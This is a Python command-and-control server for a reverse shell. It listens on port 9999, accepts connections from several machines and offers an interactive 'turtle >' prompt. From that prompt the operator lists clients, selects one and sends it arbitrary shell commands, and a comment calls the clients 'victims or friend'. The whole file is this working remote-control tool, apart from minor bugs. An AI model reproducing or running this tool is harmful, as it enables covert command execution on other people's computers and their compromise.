#!/usr/bin/env python3
import sys
import time
import socket
import threading
from queue import Queue

queue = Queue()
NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
connections_list = []
address_list = []


# Create a socket (connect two computers)
def create_socket():
    try:
        global host
        global port
        global sock
        host = ""
        port = 9999
        sock = socket.socket()
    except socket.error() as msg:
        print("Socket creation error: " + str(msg))


# Sending the socket and listening for connection
def bind_socket():
    try:
        global host
        global port
        global sock
        print("Binding the Port " + str(port))

        sock.bind((host, port))
        sock.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying")
        bind_socket()


############################################
# Handling connection for multiple client
# Saving to a list
############################################
# Closing previous connections when server file is restarted
def accepting_connection():
    for c in connections_list:
        c.close()

    del connections_list[:]
    del address_list[:]

    while True:
        try:
            conn, address = sock.accept()
            sock.setblocking(True)  # prevents timeout
            connections_list.append(conn)
            address_list.append(address)
            print("Connection has been established: " + address[0])
        except socket.error as err:
            print("Error accepting connection " + str(err))


############################################
# Second threading functions -
# 1) See all the clients
# 2) Select a client
# 3) Send commands to the connected client
#
# Interactive prompt for sending commands
# turtle > list
# 0. Client-A Port
# 1. Client-B Port
# 2. Client-C Port
# turtle > select 1
############################################
def start_turtle():
    while True:
        cmd = input('turtle > ')
        if cmd == 'list':
            list_connection()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized!")


# Display all current active connections with the client
def list_connection():
    result = ""

    for i, conn in enumerate(connections_list):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del connections_list[i]
            del address_list[i]
            continue

        results = str(i) + " " + str(address_list[i][0]) + " " + str(address_list[i][1]) + "\n"

        # Display like -> 1. 192.168.0.1 9999
        print("-"*5 + "Clients" + "-*5" + "\n" + results)


# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = connections_list[target]
        print("You are now connected to : " + str(address_list[target][0]))
        print(str(address_list[target][0]) + "> ", end="")
        return conn
        # display like -> 192.168.0.1 > dir
    except:
        print("Selection not valid!")
        return None


# Send command to client / victims or friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), 'utf-8')
                print(client_response, end='')
        except:
            print("Error sending command!")


# Create workers threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        th = threading.Thread(target=work)
        th.daemon = True
        th.start()


# Do next job that is in the queue
# 1. Handle connection
# 2. Send Commands
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connection()
        if x == 2:
            start_turtle()
        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


create_workers()
create_jobs()
